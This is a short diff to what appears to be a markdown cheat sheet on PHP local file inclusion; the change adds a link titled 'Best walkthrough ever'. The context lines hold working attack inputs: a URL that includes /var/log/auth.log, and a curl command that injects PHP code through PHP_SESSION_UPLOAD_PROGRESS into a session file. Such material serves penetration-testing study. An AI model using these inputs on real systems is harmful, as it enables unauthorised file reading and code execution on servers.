@@ -116,3 +116,6 @@ http://example.com/index.php?page=/var/log/auth.log
 curl --cookie "PHPSESSID=attacker" -F "PHP_SESSION_UPLOAD_PROGRESS=<?php phpinfo(); ?>" -F "file=@test.png"
 #then view session path like /var/lib/php/sess_attacker
 ```
+
+# Best walkthrough ever
+[Click here](https://miro.medium.com/v2/resize:fit:644/1*UPMlwBWgKMSUzSvY5mt5uw.png)
